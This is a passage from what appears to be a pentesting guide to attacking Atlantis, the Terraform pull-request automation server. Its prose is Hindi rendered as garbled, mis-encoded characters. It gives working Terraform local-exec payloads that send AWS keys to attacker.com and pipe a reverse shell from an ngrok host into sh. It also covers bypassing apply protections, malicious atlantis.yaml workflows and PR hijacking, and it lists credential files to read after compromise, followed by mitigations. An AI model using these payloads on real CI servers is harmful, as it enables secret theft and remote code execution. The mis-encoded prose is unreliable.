рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдкрд░ рдПрдХ рдирдИ рд╢рд╛рдЦрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ PR рдЬрдирд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк **`atlantis apply` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк Atlantis рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ RCE рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ рдЖрдорддреМрд░ рдкрд░ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ:

* **Mergeable**: рдпрджрд┐ Atlantis рдореЗрдВ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯ рд╣реИ, рддреЛ рдЖрдк рдХреЗрд╡рд▓ **`atlantis apply` рддрдм рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм PR mergeable рд╣реЛ** (рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рдкрдбрд╝реЗрдЧрд╛)ред
* [**рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдмрд╛рдпрдкрд╛рд╕**](https://github.com/carlospolop/hacktricks-cloud/blob/in/pentesting-ci-cd/broken-reference/README.md) рдХреА рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
* **Approved**: рдпрджрд┐ Atlantis рдореЗрдВ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯ рд╣реИ, рддреЛ рдХрд┐рд╕реА **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ PR рдХреЛ рдордВрдЬреВрд░реА рджреЗрдиреА рд╣реЛрдЧреА** рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдЖрдк `atlantis apply` рдЪрд▓рд╛ рд╕рдХреЗрдВ
* рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк [**Gitbot рдЯреЛрдХрди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](https://github.com/carlospolop/hacktricks-cloud/blob/in/pentesting-ci-cd/broken-reference/README.md)

**`terraform apply` рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг Terraform рдлрд╝рд╛рдЗрд▓ рдкрд░ рдЪрд▓рд╛рдирд╛** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)\*\* рдХреЗ рд╕рд╛рдеред\*\*\
рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХреБрдЫ рдкреЗрд▓реЛрдб `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдП:

```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```

рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рд╕реЗ **рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ** рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдПрдХ **рдЕрдзрд┐рдХ рдЧреБрдкреНрдд рддрд░реАрдХреЗ рд╕реЗ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

### Terraform Param Injection

рдЬрдм `atlantis plan` рдпрд╛ `atlantis apply` рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ terraform рдиреАрдЪреЗ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, рдЖрдк atlantis рдкрд░ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХреА рдЯрд┐рдкреНрдкрдгреА рдХрд░рдХреЗ terraform рдХреЛ рдХрдорд╛рдВрдб рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```

### рдХрд╕реНрдЯрдо рд╡рд░реНрдХрдлреНрд▓реЛ

`atlantis.yaml` рдлрд╛рдЗрд▓ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХрд╕реНрдЯрдо рдмрд┐рд▓реНрдб рдХрдорд╛рдВрдбреНрд╕** рдХреЛ рдЪрд▓рд╛рдирд╛ред Atlantis `pull request` рд╢рд╛рдЦрд╛ рдХреА `atlantis.yaml` рдлрд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, `master` рдХреА **рдирд╣реАрдВ**ред\
рдЗрд╕ рд╕рдВрднрд╛рд╡рдирд╛ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:

{% hint style="danger" %}
рдпрджрд┐ [**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) рдлреНрд▓реИрдЧ `allow_custom_workflows` рдХреЛ **True** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рд╡рд░реНрдХрдлреНрд▓реЛ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд░реЗрдкреЛ рдХреА **`atlantis.yaml`** рдлрд╛рдЗрд▓ рдореЗрдВ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рднреА рд╕рдВрднрд╡рддрдГ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХрд┐ **`allowed_overrides`** рдореЗрдВ **`workflow`** рдХреЛ рднреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдП рддрд╛рдХрд┐ **рд╡рд░реНрдХрдлреНрд▓реЛ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИред

рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ **Atlantis рд╕рд░реНрд╡рд░ рдореЗрдВ RCE рдХреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджреЗ рджреЗрдЧрд╛ рдЬреЛ рдЙрд╕ рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ**ред

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### рдпреЛрдЬрдирд╛/рд▓рд╛рдЧреВ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдирд╛

рдпрджрд┐ [**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) рдлреНрд▓реИрдЧ `allowed_overrides` рдореЗрдВ `apply_requirements` рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдПрдХ рд░реЗрдкреЛ рдХреЗ рд▓рд┐рдП **рдпреЛрдЬрдирд╛/рд▓рд╛рдЧреВ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдирд╛** рд╕рдВрднрд╡ рд╣реИред

```yaml
repos:
- id: /.*/
apply_requirements: []
```

### PR Hijacking

рдпрджрд┐ рдХреЛрдИ рдЖрдкрдХреЗ рдорд╛рдиреНрдп pull requests рдкрд░ **`atlantis plan/apply` рдЯрд┐рдкреНрдкрдгрд┐рдпрд╛рдБ рднреЗрдЬрддрд╛ рд╣реИ,** рддреЛ рдпрд╣ terraform рдХреЛ рдЙрд╕ рд╕рдордп рдЪрд▓рд╛рдПрдЧрд╛ рдЬрдм рдЖрдк рдирд╣реАрдВ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдкрдиреЗ **branch protection** рдореЗрдВ рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИ рдХрд┐ рдЬрдм рднреА рдХреЛрдИ **рдирдпрд╛ commit рдкреБрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддреЛ рд╣рд░ PR рдХреЛ **рдкреБрдирдГ рдореВрд▓реНрдпрд╛рдВрдХрди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣реЗрдВ, рддреЛ рдХреЛрдИ рднреА **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЙрдиреНрдлрд╝рд┐рдЧреНрд╕ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ** (рдкрд┐рдЫрд▓реЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ) terraform рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ, `atlantis plan/apply` рдЪрд▓рд╛рдПрдВ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

рдпрд╣ Github branch protections рдореЗрдВ **рд╕реЗрдЯрд┐рдВрдЧ** рд╣реИ:

![](<../.gitbook/assets/image (31).png>)

### Webhook Secret

рдпрджрд┐ рдЖрдк **webhook secret рдЪреБрд░рд╛рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ **рдХреЛрдИ webhook secret рдЗрд╕реНрддреЗрдорд╛рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ,** рддреЛ рдЖрдк **Atlantis webhook рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рд╕реАрдзреЗ atlatis commands рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

### Bitbucket

Bitbucket Cloud **webhook secrets рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред** рдЗрд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ Bitbucket рд╕реЗ **рдлрд░реНрдЬреА рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдХреЗрд╡рд▓ Bitbucket IPs рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣реЗ рд╣реИрдВред

* рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** Bitbucket рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЬреИрд╕реЗ рджрд┐рдЦрдиреЗ рд╡рд╛рд▓реЗ **рдлрд░реНрдЬреА рдЕрдиреБрд░реЛрдз Atlantis рдХреЛ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред**
* рдпрджрд┐ рдЖрдк `--repo-allowlist` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рд╡реЗ рдХреЗрд╡рд▓ рдЙрди repos рдХреЗ рд▓рд┐рдП рдлрд░реНрдЬреА рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕рд▓рд┐рдП рд╡реЗ рдЬреНрдпрд╛рджрд╛ рд╕реЗ рдЬреНрдпрд╛рджрд╛ рдиреБрдХрд╕рд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЗ рдЕрдкрдиреЗ repos рдкрд░ plan/apply рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
* рдЗрд╕рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, [Bitbucket рдХреЗ IP рдкрддреЗ](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) рдХреЛ allowlist рдореЗрдВ рдбрд╛рд▓реЗрдВ (Outbound IPv4 addresses рджреЗрдЦреЗрдВ)ред

## Post-Exploitation

рдпрджрд┐ рдЖрдкрдиреЗ рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реА рд╣реИ рдпрд╛ рдХрдо рд╕реЗ рдХрдо рдЖрдкрдХреЛ рд╡рд╣рд╛рдБ LFI рдорд┐рд▓рд╛ рд╣реИ рддреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдкрдХреЛ рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:

* `/home/atlantis/.git-credentials` VCS рдкрд╣реБрдБрдЪ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╣реЛрддреЗ рд╣реИрдВ
* `/atlantis-data/atlantis.db` VCS рдкрд╣реБрдБрдЪ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рд╣реЛрддреЗ рд╣реИрдВ
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform рдХреА рд╕реНрдерд┐рддрд┐ рдлрд╝рд╛рдЗрд▓
* рдЙрджрд╛рд╣рд░рдг: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕
* `/proc/[2-20]/cmdline` `atlantis server` рдХреА Cmd line (рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)

## Mitigations

### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ pull requests рдкрд░ рдЯрд┐рдкреНрдкрдгреА рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╕рднреА рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЗ рд╕рд╛рде рднреА, рдмрд┐рдирд╛ рдЙрдЪрд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ repos рдкрд░ Atlantis рдЪрд▓рд╛рдирд╛ рдЕрднреА рднреА рдЦрддрд░рдирд╛рдХ рд╣реИред

### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

рдпрджрд┐ рдЖрдк рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ repo рдкрд░ рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ (рдЬреЛ рдЕрдиреБрд╢рдВрд╕рд┐рдд рдирд╣реАрдВ рд╣реИ, рдКрдкрд░ рджреЗрдЦреЗрдВ) рддреЛ рдЖрдкрдХреЛ `--allow-fork-prs` рд╕реЗрдЯ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ false) рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рднреА рдЕрдкрдиреЗ fork рд╕реЗ рдЖрдкрдХреЗ repo рдореЗрдВ рдПрдХ pull request рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИред

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis рдЖрдкрдХреЛ `--repo-allowlist` рдлреНрд▓реИрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реЗрдмрд╣реБрдХреНрд╕ рд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ allowlist рд░реЗрдкреЛрдЬрд┐рдЯрд░реАрдЬрд╝ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

* рд╡рд┐рд╢рд┐рд╖реНрдЯ рд░реЗрдкреЛрдЬрд┐рдЯрд░реАрдЬрд╝: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* рдЖрдкрдХрд╛ рдкреВрд░рд╛ рд╕рдВрдЧрдарди: `--repo-allowlist=github.com/runatlantis/*`
* рдЖрдкрдХреЗ GitHub Enterprise рд╕реНрдерд╛рдкрдирд╛ рдореЗрдВ рд╣рд░ рд░реЗрдкреЛрдЬрд┐рдЯрд░реА: `--repo-allowlist=github.yourcompany.com/*`
* рд╕рднреА рд░реЗрдкреЛрдЬрд┐рдЯрд░реАрдЬрд╝: `--repo-allowlist=*`. рдЬрдм рдЖрдк рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╣реЛрдВ рддреЛ рдЙрдкрдпреЛрдЧреА рд╣реИ рд▓реЗрдХрд┐рди рдПрдХ webhook secret рд╕реЗрдЯ рдХрд┐рдП рдмрд┐рдирд╛ рдЦрддрд░рдирд╛рдХ рд╣реИред

рдпрд╣ рдлреНрд▓реИрдЧ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХрд╛ Atlantis рд╕реНрдерд╛рдкрдирд╛ рдЙрди рд░реЗрдкреЛрдЬрд┐рдЯрд░реАрдЬрд╝ рдХреЗ рд╕рд╛рде рдЗрд╕реНрддреЗрдорд╛рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП `atlantis server --help` рджреЗрдЦреЗрдВред

### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

рдпрджрд┐ рдЖрдкрдХреЗ рдЦрддрд░реЗ рдХреЗ рдореЙрдбрд▓ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг Terraform рдХреЛрдб рдХреЗ рд╕рд╛рде pull requests рдЬрдорд╛ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рддреЛ рдЖрдкрдХреЛ рдЬрд╛рдЧрд░реВрдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ `terraform apply` рдЕрдиреБрдореЛрджрди рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИрдВред [`external` рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ `terraform plan` рдореЗрдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрд╣ рдХреЛрдб рддрдм рдЖрдкрдХреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк:

1. Atlantis рдЗрдореЗрдЬ рдпрд╛ рд╣реЛрд╕реНрдЯ рдореЗрдВ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░реНрд╕ рдХреЛ рдмреЗрдХ рдХрд░реЗрдВ рдФрд░ рдЙрддреНрдкрд╛рджрди рдореЗрдВ рдПрдЧреНрд░реЗрд╕ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВред
2. рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдПрдЧреНрд░реЗрд╕ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ, рдЗрд╕ рддрд░рд╣ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдХрд┐рд╕рдХреЗ рдкрд╛рд╕ рд╣реИред
3. рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджрд┐рдП рдЧрдП рдкреНрд░реЛрд╡рд╛рдЗрдбрд░реНрд╕ рдпрд╛ рдбреЗрдЯрд╛ рд╕реНрд░реЛрддреЛрдВ рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рдЦрд┐рд▓рд╛рдл рдпрд╛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ PRs рдХреЗ рдЦрд┐рд▓рд╛рдл рдЕрдкрдиреЗ [server-side repo configuration](https://www.runatlantis.io/docs/server-side-repo-config.html) рдХреЗ `plan` рдЪрд░рдг рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВред рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рдЖрдк рдЕрддрд┐рд░рд┐рдХреНрдд рдорд╛рдиреНрдпрддрд╛ рднреА рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ PR рдкрд░ "thumbs-up" рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ `plan` рдХреЛ рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ред Conftest рдпрд╣рд╛рдБ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis рдХреЛ `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Webhook secrets рд╕реЗрдЯ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред `--repo-allowlist` рдлреНрд▓реИрдЧ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдмрд┐рдирд╛ webhook secret рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ allowlisted рд░реЗрдкреЛрдЬрд┐рдЯрд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдкреЛрдЬрд╝ рдХрд░рддреЗ рд╣реБрдП Atlantis рдХреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред Webhook secrets рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ webhook рдЕрдиреБрд░реЛрдз рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрдкрдХреЗ VCS рдкреНрд░рджрд╛рддрд╛ (GitHub рдпрд╛ GitLab) рд╕реЗ рдЖ рд░рд╣реЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдк Azure DevOps рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ webhook secrets рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдмреЗрд╕рд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЬреЛрдбрд╝реЗрдВред

### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps рд╕рднреА webhook рдЗрд╡реЗрдВрдЯреНрд╕ рдореЗрдВ рдПрдХ рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реЗрдбрд░ рднреЗрдЬрдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ webhook рд╕реНрдерд╛рди рдХреЗ рд▓рд┐рдП рдПрдХ HTTPS URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

